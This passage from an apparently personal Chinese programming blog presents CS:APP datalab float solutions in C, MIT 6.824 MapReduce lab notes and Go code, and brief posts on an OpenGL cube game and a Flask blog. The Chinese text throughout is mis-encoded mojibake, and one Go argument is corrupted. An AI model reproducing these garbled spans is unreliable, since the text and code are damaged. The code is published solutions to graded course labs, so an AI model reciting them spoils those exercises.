  n = n + ((!!(x &gt;&gt; 16)) &lt;&lt; 4);  // å¦‚æœxå³ç§»16ä½åæ˜¯0ï¼Œè¯´æ˜xçš„é«˜16ä½æ˜¯0ã€‚å¦‚æœä¸æ˜¯ï¼Œnç´¯åŠ  1&lt;&lt;4 = 16
  n = n + ((!!(x &gt;&gt; (8 + n))) &lt;&lt; 3);  // å†å³ç§»8ä½
  n = n + ((!!(x &gt;&gt; (4 + n))) &lt;&lt; 2);  // 4
  n = n + ((!!(x &gt;&gt; (2 + n))) &lt;&lt; 1);  // 2
  n = n + ((!!(x &gt;&gt; (1 + n))));  // 1
  n = n + (x &gt;&gt; n);  // çœ‹çœ‹

  return n + 1;
}
//float
/* 
 * floatScale2 - Return bit-level equivalent of expression 2*f for
 *   floating point argument f.
 *   Both the argument and result are passed as unsigned int's, but
 *   they are to be interpreted as the bit-level representation of
 *   single-precision floating point values.
 *   When argument is NaN, return argument
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
unsigned floatScale2(unsigned uf) {
  int sign = uf &amp; 0x80000000;
  int exp = uf &amp; 0x7f800000;
  int frag = uf &amp; 0x007fffff;
  if (exp == 0) {
    //éè§„æ ¼åŒ–çš„æ•°
    return sign | frag &lt;&lt; 1;
  }
  if (exp == 0x7f800000) { // inf or NaN
    return uf;
  }
  // è§„æ ¼åŒ–çš„æ•°
  exp += 0x0800000; // æŒ‡æ•°åŠ 1ï¼Œç›¸å½“äº ä¹˜äºŒ
  if (exp == 0x7f800000) {
    // inf
    frag = 0;
  }
  return sign | exp | frag;
}
/* 
 * floatFloat2Int - Return bit-level equivalent of expression (int) f
 *   for floating point argument f.
 *   Argument is passed as unsigned int, but
 *   it is to be interpreted as the bit-level representation of a
 *   single-precision floating point value.
 *   Anything out of range (including NaN and infinity) should return
 *   0x80000000u.
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
int floatFloat2Int(unsigned uf) {
  int sign = uf &amp; 0x80000000;
  int exp = ((uf &amp; 0x7f800000) &gt;&gt; 23) - 127; // è§„æ ¼åŒ–æ•°çš„æŒ‡æ•°çš„çœŸå€¼ï¼ˆéè§„æ ¼åŒ–æ•°ä¸€å¾‹è¿”å›0ï¼‰
  int frag = (uf &amp; 0x007fffff) | 0x00800000; // è¡¥ä¸Šå‰å¯¼1
  int absval;
  if (exp &lt; 0) {
    return 0;
  }
  if (exp &gt; 30) {
    return 0x80000000;
  }
  if (exp &lt; 23) {
    // éœ€è¦æˆªæ–­éƒ¨åˆ†å°¾æ•°
    absval = frag &gt;&gt; (23 - exp);
  } else {
    absval = frag &lt;&lt; (exp - 23);
  }
  return sign == 0x80000000 ? -absval : absval;
}
/* 
 * floatPower2 - Return bit-level equivalent of the expression 2.0^x
 *   (2.0 raised to the power x) for any 32-bit integer x.
 *
 *   The unsigned value that is returned should have the identical bit
 *   representation as the single-precision floating-point number 2.0^x.
 *   If the result is too small to be represented as a denorm, return
 *   0. If too large, return +INF.
 * 
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while 
 *   Max ops: 30 
 *   Rating: 4
 */
unsigned floatPower2(int x) {
  if (x &lt; -149) {
    return 0;
  }
  // éè§„æ ¼åŒ–çš„æ•°
  if (x &lt; -126) {
    return 0x800000 &gt;&gt; (-126 - x);
  }
  // è§„æ ¼åŒ–çš„æ•°
  if (x &lt;= 127) {
    return (x + 127) &lt;&lt; 23;
  } else {
    // +INF
    return 0xff &lt;&lt; 23;
  }
}
</code></pre>
<p>ps: gdbå¥½éš¾ç”¨ğŸ˜…</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6824-lab1mapreduce"><a class="header" href="#mit-6824-lab1mapreduce">MIT 6.824 Lab1:MapReduce</a></h1>
<p>Paper: MapReduce(2004) ä¸€ç§ç¼–ç¨‹æ¨¡å¼ï¼Œå±è”½äº†åˆ†å¸ƒå¼ç³»ç»Ÿçš„å¤æ‚ï¼Œç”±ä¸€ä¸ªmasteræ¥åˆ†é…ä»»åŠ¡ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦RPCè°ƒç”¨</p>
<p>é‡åˆ°é—®é¢˜ï¼šä¸çŸ¥é“å¦‚ä½•åˆ†é…ç»™reduce workeréœ€è¦è¯»å–çš„æ–‡ä»¶</p>
<p>ç†è§£ä¸è§£å†³ï¼šå¯¹äºæ¯ä¸€ä¸ªæ‰§è¡Œmapçš„worker Aæ¥è¯´ï¼ŒAéœ€è¦è¯»å–ä¸€ä¸ªç¡®å®šçš„æ–‡ä»¶file1ï¼Œå°†æ¯ä¸€ä¸ªä¸åŒçš„key-valueå¯¹ï¼ˆå³ä¸€ä¸ªå•è¯-&gt;1ï¼‰å†™å…¥Nreduceä¸ªä¸­é—´æ–‡ä»¶ä¹‹ä¸€ï¼ŒNreduceç”±ç”¨æˆ·æŒ‡å‡ºï¼Œè‡³äºå†™å…¥å“ªä¸€ä¸ªæ–‡ä»¶ï¼Œéœ€è¦ç”¨hashï¼ˆkeyï¼‰% Nreduce æ¥è·å¾—è¯¥æ–‡ä»¶ç´¢å¼•ã€‚For example, ç¬¬xä¸ªmapä»»åŠ¡ï¼Œå¯¹äºå€¼ä¸ºkeyçš„é”®å€¼å¯¹ï¼ˆihash(key)%Nreduce = Yï¼‰ï¼Œéœ€è¦å†™å…¥mr-X-Y.txtçš„ä¸­é—´æ–‡ä»¶ä¸­ã€‚</p>
<p>å¯¹äºæ‰§è¡Œreduceä»»åŠ¡çš„worker B</p>
<ol>
<li>ä»–éœ€è¦è¯»å–æ‰€æœ‰ mr-*-r.txtçš„æ–‡ä»¶ï¼Œrä¸ºè¿™ä¸ªreduceä»»åŠ¡çš„id</li>
<li>sortï¼Œæ ¹æ®keyå€¼æ’åºï¼Œç›¸åŒçš„keyå€¼å°±è¢«æ”¾åœ¨ä¸€èµ·äº†</li>
<li>è°ƒç”¨reduceå‡½æ•°</li>
<li>å°†ç»“æœå†™å…¥mr-out-r.txt</li>
</ol>
<p>å…³äºLinuxä¸‹çš„timeoutï¼Œåœ¨MacOSä¸­æ²¡æœ‰å¯¹åº”çš„å‘½ä»¤ï¼Œä½¿ç”¨brewå®‰è£…coreutilsï¼Œå†åœ¨lab1çš„æµ‹è¯•è„šæœ¬ä¸­ä½¿ç”¨alias timeout=gtimeoutï¼Œä½œä¸ºæ›¿ä»£</p>
<p>ç¬¬ä¸€æ¬¡è¿›è¡Œæµ‹è¯•åï¼Œå‘ç°æµ‹è¯•è„šæœ¬åªå¯åŠ¨äº†3ä¸ªworkerï¼Œæ‰€ä»¥æˆ‘çš„ä»£ç è¿˜éœ€ä¿®æ”¹ï¼Œworkerå®Œæˆå½“å‰åˆ†é…çš„ä»»åŠ¡åï¼Œç»§ç»­æ¥å—masterçš„assignæŒ‡ä»¤ã€‚</p>
<p>ç»è¿‡ä¿®æ”¹ï¼Œå•ä¸ªworkerå¯ä»¥ä¸æ–­å‘masterè¯·æ±‚ï¼Œå®Œæˆæ‰€æœ‰çš„mapreduceä»»åŠ¡ï¼ŒåŒæ—¶åŠ å…¥äº†ä»»åŠ¡çš„è¶…æ—¶åˆ¤æ–­ï¼Œå³åœ¨masterçš„æ•°æ®ç»“æ„ä¸­å¢åŠ äº†ä¸€ä¸ªmapï¼Œä»ä»»åŠ¡å·åˆ°ä»»åŠ¡å¼€å§‹æ—¶é—´çš„æ˜ å°„ã€‚ä½†æ˜¯æµ‹è¯•è„šæœ¬å‘ç°å‡ºç°äº†map concurrent writeï¼ŒåŸæ¥æ˜¯æ–°å¢åŠ çš„mapç»“æ„æœªåŠ é”ã€‚</p>
<p>å†æ¬¡æµ‹è¯•é‡åˆ°é—®é¢˜ï¼Œæ²¡æœ‰é€šè¿‡reduceä»»åŠ¡çš„å¹¶å‘æµ‹è¯•ã€‚ç°è±¡ååˆ†å¥‡æ€ªï¼Œå•ç‹¬æµ‹è¯•reduceçš„å¹¶å‘æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åªè¦åŠ äº†word countçš„æµ‹è¯•è„šæœ¬ï¼Œreduceä»»åŠ¡å°±timeoutã€‚</p>
<p>ä¸ºäº†æ£€æµ‹worker crashï¼Œä½¿ç”¨heartbeatï¼ˆå‚è€ƒå¤§ä½¬vttaï¼‰æ¥æ¸…é™¤å®•æœºçš„workerï¼ŒåŒæ—¶å¢åŠ äº†workerçš„å”¯ä¸€idç”Ÿæˆå‡½æ•°ï¼Œä½¿ç”¨tempfileå†™å…¥reduceçš„ä»»åŠ¡</p>
<p><strong>2021/5/12 update</strong></p>
<p>é‡æ„äº†ä¸‹ä»£ç ï¼Œæ²¡æœ‰ä½¿ç”¨å¿ƒè·³æ¥ä¿è¯workerçš„æ­£å¸¸è¿è¡Œï¼Œè€Œæ˜¯åªåœ¨masterä¸­å¢åŠ å¯¹æ³¨å†Œworkerçš„å®šæ—¶å™¨ã€‚å¦‚æœworkeråœ¨è§„å®šæ—¶é—´å†…æ²¡æœ‰RPCè¯·æ±‚ï¼Œmasterä¼šåˆ é™¤æœ‰å…³workerçš„æ•°æ®ç»“æ„ï¼Œå½“workerå‘æ¥è¿Ÿåˆ°çš„RPCæ—¶ï¼Œmasterä¸äºˆå¤„ç†ã€‚</p>
<p>main/mrworker.goä¸­ä¼šè°ƒç”¨Workerå‡½æ•°å¼€å¯workeræ¥è¯·æ±‚ä»»åŠ¡ï¼ˆmapjobã€reducejobï¼‰ï¼Œå¤„ç†é€»è¾‘å¦‚ä¸‹ï¼š</p>
<pre><code class="language-go">func Worker(mapf func(string, string) []KeyValue,
	reducef func(string, []string) string) {

	registReply := RegistResp{}
	if ok := call(&quot;Master.RegisterWorker&quot;, &amp;RegistArgs{}, Â®istReply); !ok {
		return
	}
	workerID := registReply.WorkerID

	// Your worker implementation here.
	// send call to request task
	tryAccessTimes := 0
	for {
		args := RequestArgs{-1, -1, workerID}
		reply := ResponseType{}

		if ok := call(&quot;Master.AcceptWorker&quot;, &amp;args, &amp;reply); !ok {
			fmt.Println(&quot;worker &gt; request failed, sleep...&quot;)
			time.Sleep(100 * time.Millisecond)
			tryAccessTimes++
			if tryAccessTimes &gt; 5 {
				fmt.Println(&quot;worker &gt; cannot access master. Quit&quot;)
				return
			}
			continue
		}

		tryAccessTimes = 0
		if reply.NReduce == -1 {
			fmt.Println(&quot;worker &gt; exit&quot;)
			return
		}

		// fmt.Println(&quot;apply job success&quot;)
		switch reply.JobType {
		case MAP: // map job
			mapJob(&amp;reply, mapf)
		case REDUCE:
			reduceJob(&amp;reply, reducef)
		}
	}
}
</code></pre>
<p>å¤„ç†é€»è¾‘ä¸­å®šä¹‰äº†ä¸‰ç§RPCï¼ˆä½†æ˜¯åªä½¿ç”¨äº†ä¸¤ç§è¯·æ±‚argsï¼‰</p>
<pre><code class="language-go">const (
	MAP = 1
	REDUCE = 2
)

type RegistArgs struct {

}

type RegistResp struct {
	WorkerID int
}

// RequestArgs workerè¯·æ±‚çš„ç±»å‹
type RequestArgs struct {
	TaskNum int // è¿”å›è¢«åˆ†é…çš„ä»»åŠ¡ç´¢å¼•ï¼Œåˆå§‹è¯·æ±‚æ—¶ä¸ºç©º
	JobType int // ä»»åŠ¡ç±»å‹ 1-map 2-reduce
	WorkerID int // è¿™ä¸ªworkerçš„ID
}

// masterçš„åº”ç­”
type ResponseType struct {
	NReduce int // masterçš„ç”¨æˆ·å‚æ•°ï¼Œå–æ¨¡ç”¨
	JobType int
	BucketName string // åˆ†é…çš„ä»»åŠ¡åç§° ï¼ˆmapä»»åŠ¡éœ€è¦è¯»å–çš„æ–‡ä»¶å)
	TaskNum int 	// ä»»åŠ¡å· 
					// 1ã€å¯¹äºmapä»»åŠ¡ï¼Œmasteræ•°æ®ç»“æ„ä¸­çš„filesçš„ä¸‹æ ‡ + 1
					// 2ã€å¯¹äºreduceä»»åŠ¡ï¼ŒtaskNumåœ¨ [0, NReduce) åŒºé—´å†…
}
</code></pre>
<p>è¿™è¾¹ä½¿ç”¨äº†counterå‡½æ•°ç”Ÿæˆå…¨å±€å”¯ä¸€çš„worker IDã€‚</p>
<pre><code class="language-go">func counter() (f func() int) {
	i := 0
	return func() int {
		i += 1
		return i
	}
}

// generate a unique id for a worker or a Job
var uniqueID = counter()
</code></pre>
<p>mapjobçš„å¤„ç†</p>
<pre><code class="language-go">func mapJob(reply *ResponseType,
	mapf func(string, string) []KeyValue) {
	// æ‰“å¼€åŸå§‹æ–‡ä»¶
	file, err := os.Open(reply.BucketName)
	if err != nil {
		log.Fatalf(&quot;cannot open %v&quot;, reply.BucketName)
	}
	content, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatalf(&quot;cannot read %v&quot;, reply.BucketName)
	}
	file.Close()

	// è°ƒç”¨ç”¨æˆ·çš„mapå‡½æ•°
	kva := mapf(reply.BucketName, string(content))

	// å¯¹äºæ¯ä¸ªkeyå€¼ï¼Œåˆ’åˆ†ä¸ºnReduceä¸ªç»„
	var groups = make([][]KeyValue, reply.NReduce)
	for _, kv := range kva {
		gid := ihash(kv.Key) % reply.NReduce
		groups[gid] = append(groups[gid], kv)
	}

	// å°†ä¸­é—´æ–‡ä»¶å†™å…¥disk,æ³¨æ„å†™å…¥çš„æ˜¯NReduceä¸ªä¸åŒæ–‡ä»¶
	for index, kvs := range groups {
		// åˆ›å»ºæˆ–æ‰“å¼€intermediateæ–‡ä»¶
		filename := &quot;mr-&quot; + strconv.Itoa(reply.TaskNum) + &quot;-&quot; + strconv.Itoa(index)
		// file, _ = os.OpenFile(filename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0644)
		file, err := ioutil.TempFile(&quot;.&quot;, &quot;mr-&quot;)
		if err != nil {
			log.Fatalln(&quot;cannot create temporary file&quot;)
		}

		enc := json.NewEncoder(file)
		for _, kv := range kvs {
			err := enc.Encode(&amp;kv)
			if err != nil {
				os.Remove(file.Name())
				// call for failure
				log.Fatal(&quot;map write file error&quot;)
			}
		}
		os.Rename(file.Name(), filename)
		if err != nil {
			log.Fatalln(&quot;cannot rename to&quot;, filename)
		}
		log.Printf(&quot;%s created.&quot;, filename)
	}

	rpArgs := RequestArgs{}
	rpArgs.JobType = MAP
	rpArgs.TaskNum = reply.TaskNum

	rpReply := ResponseType{}

	call(&quot;Master.WorkerFinished&quot;, &amp;rpArgs, &amp;rpReply) // TODO: è€ƒè™‘å¤±è´¥çš„worker

}
</code></pre>
<p>reducejobçš„å¤„ç†</p>
<pre><code class="language-go">func reduceJob(reply *ResponseType,
	reducef func(string, []string) string) {
	// è¯»å–æ‰€æœ‰å±äºtaskNumçš„mr-X-taskNum.txtæ–‡ä»¶ åˆ° intermediate
	var intermediate []KeyValue
	for i := 0; ; i++ { // iå¯¹åº”mapä»»åŠ¡å·
		filename := &quot;mr-&quot; + strconv.Itoa(i) + &quot;-&quot; + strconv.Itoa(reply.TaskNum)
		file, err := os.Open(filename)
		if err != nil {
			break
		}
		dec := json.NewDecoder(file)
		for {
			var kv KeyValue
			if err := dec.Decode(&amp;kv); err != nil {
				break
			}
			intermediate = append(intermediate, kv)
		}
		file.Close()
	}

	// sort
	sort.Sort(ByKey(intermediate))

	// æ³¨æ„ï¼ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ï¼Œé˜²æ­¢æ®‹ç¼ºæ–‡ä»¶è¢«å†™å…¥ï¼
	oname := fmt.Sprintf(&quot;mr-out-%v&quot;, reply.TaskNum)
	ofile, err := ioutil.TempFile(&quot;.&quot;, &quot;mr-&quot;)
	// oname := &quot;mr-out-&quot; + strconv.Itoa(reply.TaskNum)
	// ofile, err := os.Create(oname)
	if err != nil {
		log.Fatalln(&quot;cannot create temporary file&quot;)
	}

	fmt.Printf(&quot;worker &gt; inter len : %v\n&quot;, len(intermediate))
	// call the user define reduce function
	i := 0
	for i &lt; len(intermediate) {
		j := i + 1
		for j &lt; len(intermediate) &amp;&amp; intermediate[j].Key == intermediate[i].Key { // the same key has been sorted to be together
			j++
		}
		values := []string{}
		for k := i; k &lt; j; k++ {
			values = append(values, intermediate[k].Value)
		}
		output := reducef(intermediate[i].Key, values)

		// this is the correct format for each line of Reduce output.
		fmt.Fprintf(ofile, &quot;%v %v\n&quot;, intermediate[i].Key, output)

		i = j
	}
	err = ofile.Close()
	if err != nil {
		log.Fatalln(&quot;cannot close&quot;, oname)
	}
	err = os.Rename(ofile.Name(), oname)
	if err != nil {
		log.Fatalln(&quot;cannot rename to&quot;, oname)
	}

	rpArgs := RequestArgs{}
	rpArgs.JobType = REDUCE
	rpArgs.TaskNum = reply.TaskNum

	rpReply := ResponseType{}

	call(&quot;Master.WorkerFinished&quot;, &amp;rpArgs, &amp;rpReply) // ç›®å‰ï¼Œæœªè€ƒè™‘å¤±è´¥çš„worker
}
</code></pre>
<p>masterä¸­ä¿å­˜çš„æ•°æ®ç»“æ„</p>
<pre><code class="language-go">var (
	mu sync.Mutex
)

// State ä¸ºjobçš„çŠ¶æ€
type State int
const (
	IDLE = 0
	INPROGRESS = 1
	COMPLETE = 2
)

type Master struct {
	// Your definitions here.
	mapState map[int]State  // åºå· -ã€‹çŠ¶æ€
	fileNames []string // åºå· -&gt; æ–‡ä»¶å
	mapWorker map[int]int  // åºå· -ã€‹workerid
	mapDone bool

	nReduce int // éœ€è¦å¯åŠ¨çš„reduce workeræ•°é‡ï¼Œä¹Ÿæ˜¯æ¯ä¸ªmapä»»åŠ¡éœ€è¦å†™å…¥çš„æ–‡ä»¶æ•°é‡
	reduceState map[int]State // ä¸€ä¸ªnReduceå¤§å°çš„åˆ‡ç‰‡ï¼Œè®°å½•reduceä»»åŠ¡å®Œæˆçš„æƒ…å†µ, 0-æœªåˆ†é…ï¼Œ1-å·²åˆ†é…ï¼Œ2-å·²å®Œæˆ
	reduceWorker map[int]int // ä»»åŠ¡å· -ã€‹ worker
	reduceDone bool

	timers map[int]*time.Timer  // è®¡æ—¶å™¨ï¼Œæ˜ å°„ä¸ºworkerIDåˆ°timer
}
</code></pre>
<p>masterå¯¹ä¸‰ç§RPCçš„å¤„ç†</p>
<p>ç”¨äºworkeræ³¨å†Œçš„</p>
<pre><code class="language-go">// RegisterWorker workeræ³¨å†Œï¼Œç”Ÿæˆå®šæ—¶å™¨goroutine
func (m *Master) RegisterWorker(args *RegistArgs, reply *RegistResp) error {
	mu.Lock()
	defer mu.Unlock()

	workerID := uniqueID()
	reply.WorkerID = workerID
	m.timers[workerID] = time.NewTimer(time.Second * 10)
	log.Printf(&quot;Master &gt; new worker %v register&quot;, workerID)

	// ä¸ºæ¯ä¸ªworkeråˆ†é…ä¸€ä¸ªå®šæ—¶å™¨çº¿ç¨‹
	go func(worker int, timer &lt;-chan time.Time) {
		&lt;- timer // å¦‚æœå®šæ—¶å™¨è¶…æ—¶äº†
		mu.Lock()
		defer mu.Unlock()
		delete(m.timers, worker) // åˆ é™¤å®šæ—¶å™¨
		for jobid, wid := range m.mapWorker {
			if wid == worker {
				m.mapState[jobid] = IDLE
				delete(m.mapWorker, jobid)
				log.Printf(&quot;Master &gt; map worker %v time out&quot;, worker)
			}
		}
		for jobid, wid := range m.reduceWorker {
			if wid == worker {
				m.reduceState[jobid] = IDLE
				delete(m.reduceWorker, jobid)
				log.Printf(&quot;Master &gt; reduce worker %v time out&quot;, worker)
			}
		}
	}(workerID, m.timers[workerID].C)

	return nil
}
</code></pre>
<p>ç”¨äºworkerè¯·æ±‚ä»»åŠ¡çš„ï¼š</p>
<pre><code class="language-go">// AcceptWorker PRCå“åº” æ¥å—workerçš„è¯·æ±‚ä»»åŠ¡è¯·æ±‚
func (m *Master) AcceptWorker(args *RequestArgs, reply *ResponseType) error {
	mu.Lock()
	defer mu.Unlock()
	
	reply.NReduce = m.nReduce
	if !m.mapDone { // mapæœªå®Œæˆ
		mapjobid := m.assignMapJob(args.WorkerID)

		if mapjobid == -1 {
			return fmt.Errorf(&quot;please apply job again&quot;)
		}
		reply.JobType = MAP
		reply.BucketName = m.fileNames[mapjobid]
		reply.TaskNum = mapjobid
		
		m.mapWorker[mapjobid] = args.WorkerID

	} else if !m.reduceDone{
		rdTaskNum := m.assignReduceJob(args.WorkerID)

		if rdTaskNum == -1 {
			reply.NReduce = -1 // å‘Šè¯‰workerä¸è¦å†ç”³è¯·ä»»åŠ¡äº†
			return fmt.Errorf(&quot;no job available&quot;)
		}
		reply.JobType = REDUCE
		reply.TaskNum = rdTaskNum
	}
	return nil // success assigned
}
</code></pre>
<p>ç”¨ä¸workerå‘ŠçŸ¥ç»“æŸä»»åŠ¡çš„</p>
<pre><code class="language-go">// WorkerFinished å›åº”workerå®Œæˆå·¥ä½œ
// å¯¹äºtimeoutçš„worker,å³ä½¿workerå®Œæˆäº†ä»»åŠ¡ï¼Œç”±äºåœ¨masterä¿å­˜çš„æ•°æ®ç»“æ„ä¸­æ‰¾ä¸åˆ°å¯¹åº”çš„worker
func (m *Master) WorkerFinished(args *RequestArgs, reply *ResponseType) error {
	mu.Lock()
	defer mu.Unlock()

	if args.JobType == MAP {
		_, ok := m.mapWorker[args.TaskNum]
		if !ok {
			return fmt.Errorf(&quot;Map Worker timeout, job : %v&quot;, m.fileNames[args.TaskNum])
		}
		m.mapState[args.TaskNum] = COMPLETE
		delete(m.mapWorker, args.TaskNum)

		fmt.Printf(&quot;Map job&quot; + m.fileNames[args.TaskNum] + &quot; finish\n&quot;)
	} else if args.JobType == REDUCE {
		_, ok := m.reduceWorker[args.TaskNum]
		if !ok {
			return fmt.Errorf(&quot;Reduce worker timeout, job : %v&quot;, args.TaskNum)
		}
		m.reduceState[args.TaskNum] = COMPLETE
		delete(m.reduceWorker, args.TaskNum)

		fmt.Printf(&quot;Reduce job&quot; + strconv.Itoa(args.TaskNum) + &quot; finish\n&quot;)
	}
	return nil
}
</code></pre>
<p>masteråˆ†é…ä»»åŠ¡ä½¿ç”¨çš„å‡½æ•°</p>
<pre><code class="language-go">// æ ¹æ®jobç±»å‹æ¥é€‰æ‹©æ–‡ä»¶å
func (m *Master) assignMapJob(worker int) (job int){
	mapComplete := true
	for jobid, state := range m.mapState {
		if state == IDLE {
			job = jobid
			m.mapState[jobid] = INPROGRESS
			m.mapWorker[jobid] = worker
			return
		}
		if state != COMPLETE {
			mapComplete = false
		}
	}
	if mapComplete {
		m.mapDone = true
		log.Println(&quot;map phase compelet&quot;)
	}
	return -1
}

func (m *Master) assignReduceJob(worker int) (reduceNum int) {
	reduceComplete := true
	for jobid, state := range m.reduceState {
		if state == IDLE {
			reduceNum = jobid  // è¿”å›è¯¥reduceä»»åŠ¡çš„ç¼–å·ï¼Œå³è¿™ä¸ªreduce workerè¦è¯»å–mr-X-reduceNum.txtçš„ä¸­é—´æ–‡ä»¶
			m.reduceState[jobid] = INPROGRESS
			m.reduceWorker[jobid] = worker
			return
		}
		if state != COMPLETE {
			reduceComplete = false
		}
	}
	if reduceComplete {
		m.reduceDone = true
		log.Println(&quot;reduce phase complete&quot;)
	}
	return -1
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="magiccube"><a class="header" href="#magiccube">MagicCube</a></h1>
<h2 id="åŸºäºopenglçš„3dé­”æ–¹æ¸¸æˆ"><a class="header" href="#åŸºäºopenglçš„3dé­”æ–¹æ¸¸æˆ">åŸºäºOpenGLçš„3Dé­”æ–¹æ¸¸æˆ</a></h2>
<p>è¿™æ˜¯ä¸Šå­¦æœŸçš„è®¡ç®—æœºå›¾å½¢å­¦å’ŒC++ç¨‹åºè®¾è®¡è¯¾ç¨‹çš„è”åˆå¤§ä½œä¸šï¼Œå› ä¸ºä¸€å¹´å‰çš„flagï¼ˆä¹‹å‰å’Œå°ç»„æˆå‘˜å…±åŒå®Œæˆè¿‡ä¸€ä¸ªconsoleçš„é­”æ–¹ï¼Œç”¨çš„æ˜¯Cï¼‰ï¼Œä¸€ç›´æ‰“ç®—åšä¸€ä¸ªå¯è§†åŒ–çš„é­”æ–¹ï¼Œç›®å‰å·²ç»å®Œæˆç›¸å½“å‹å¥½çš„ç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥åœ¨è®¾è®¡å¥½çš„åœºæ™¯ä¸­è‡ªç”±ç§»åŠ¨ï¼Œç”¨é”®ç›˜æ§åˆ¶æ—‹è½¬é­”æ–¹å„ä¸ªé¢ï¼Œå›è½¦é”®å¤åŸï¼ˆå¤åŸç®—æ³•å°±ç®€ç•¥äº†ï¼šåç€è½¬å›æ¥ï¼‰ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p>
<p><a href="https://github.com/Sugar-Coder/MagicCube.git">GitHubé¡¹ç›®åœ°å€</a></p>
<p>å±•ç¤ºï¼š</p>
<p><img src="./images/blog20200201/skyMC.gif" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bluelogåšå®¢çš„æ­å»º"><a class="header" href="#bluelogåšå®¢çš„æ­å»º">bluelogåšå®¢çš„æ­å»º</a></h1>
<blockquote>
<p>2023.1.3 ä¿ç•™çºªå¿µä¸‹ç¬¬ä¸€ç¯‡åšå®¢</p>
</blockquote>
<p>è¿™æ˜¯æˆ‘ç”¨è‡ªå·±æ­å»ºçš„blogå†™çš„ç¬¬ä¸€ç¯‡æµ‹è¯•æ€§è´¨çš„åšæ–‡ï¼ŒåŒå­¦ä»¬å¯ä»¥éšæ„è¯„è®ºè¯•è¯•å‘€</p>
<h2 id="å‡†å¤‡"><a class="header" href="#å‡†å¤‡">å‡†å¤‡</a></h2>
<p>è¿™ä¸ªåšå®¢ç”¨flaskä½œä¸ºåç«¯æ¡†æ¶ï¼Œå‰ç«¯ä½¿ç”¨bootstrapæ¨¡æ¿ï¼Œjinja2å¼•æ“æ¸²æŸ“é¡µé¢ï¼Œmysqlæ•°æ®åº“æ”¯æŒï¼Œé˜¿é‡Œäº‘çš„ubuntuä½œä¸ºæœåŠ¡å™¨éƒ¨ç½²ï¼ˆ10å…ƒ/æœˆï¼Œå¥½ç”¨ä¸è´µï¼‰æ­å»ºçš„æ•™ç¨‹å‚è€ƒäº†æè¾‰çš„è‘—ä½œã€Šflask webå¼€å‘å®æˆ˜ã€‹ï¼Œé“¾æ¥å¯ä»¥åœ¨åšå®¢åº•éƒ¨æ‰¾åˆ°ï¼ŒçœŸå¿ƒè§‰å¾—ä»–å†™çš„flask webå¼€å‘å®æˆ˜æ˜¯ä¸€æœ¬å¥½ä¹¦ã€‚ä»¥åä¼šæ…¢æ…¢æ‰©å……è¯¦ç»†æ­å»ºè®°å½•</p>
<h2 id="éƒ¨ç½²"><a class="header" href="#éƒ¨ç½²">éƒ¨ç½²</a></h2>
<p>åœ¨linuxæœåŠ¡å™¨ä¸Šéƒ¨ç½²çš„æ—¶å€™ï¼Œä¸€å®šè¦è®°å¾—è·¯å¾„çš„è®¾ç½®ï¼ˆç”¨nginxå’Œsupervisorçš„æ—¶å€™ï¼‰ï¼Œä¾‹å¦‚ubuntuçš„è·¯å¾„æ˜¯/home/username/link</p>
<p>å†æ¥æ’å…¥ä¸ªå›¾ç‰‡ï¼š
ï¼ˆè¿™ä¸ªå›¾ç‰‡æ˜¯é€šè¿‡ckeditorç›´æ¥å­˜åˆ°æˆ‘çš„æœåŠ¡å™¨ä¸Šé¢çš„ï¼Œå›¾ç‰‡åŸæ¥å†è…¾è®¯äº‘çš„æœåŠ¡å™¨å­˜ç€çš„ï¼Œç°åœ¨æ²¡äº†ï¼‰</p>
<p>ä»¥ä¸‹æ˜¯ç¼–è¾‘çš„é¡µé¢ï¼Œç”¨äº†ckeditor4æä¾›çš„flaskæ¥å£ï¼Œå¯ä»¥å¿«é€Ÿå®ç°æ’å…¥å›¾ç‰‡ï¼Œä»£ç ï¼Œåˆ†å‰²çº¿ç­‰å…ƒç´ ã€‚ä½†<br>å¶å°”ä¼šå‡ºç°æ’å…¥å›¾ç‰‡å‡ºç°505é”™è¯¯ã€‚åŸå› å‘ç°æ˜¯å›¾ç‰‡çš„æ ¼å¼ä¸å¯¹ï¼Œåªæ”¯æŒjpgã€jpegã€pngã€gifæ ¼å¼ï¼ˆè¯¦è§setting.pyï¼‰ã€‚</p>
<h2 id="change-log"><a class="header" href="#change-log">Change log</a></h2>
<p>2020.5.5æ›´æ–°</p>
<p>å¢åŠ äº†ç”µå­é‚®ä»¶åŠŸèƒ½ï¼Œè¯„è®ºå›å¤åä¼šå‘è¯„è®ºè€…å‘é€æé†’é‚®ä»¶</p>
<p>2020.6.3æ›´æ–°</p>
<p>å¢åŠ äº†å…¨æ–‡æœç´¢åŠŸèƒ½</p>
<p>2020.12.5æ›´æ–°</p>
<p>å¢åŠ äº†ç™»å½•éªŒè¯å’Œåšå®¢çš„å®‰å…¨æ€§</p>

                        <div id="comment-container"></div>
                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>
        
        <!-- Custom JS scripts -->
        <script type="text/javascript" src="theme/comments.js"></script>
        <script type="text/javascript" src="theme/toc.js"></script>
        <script type="text/javascript">
        window.addEventListener('load', function() {
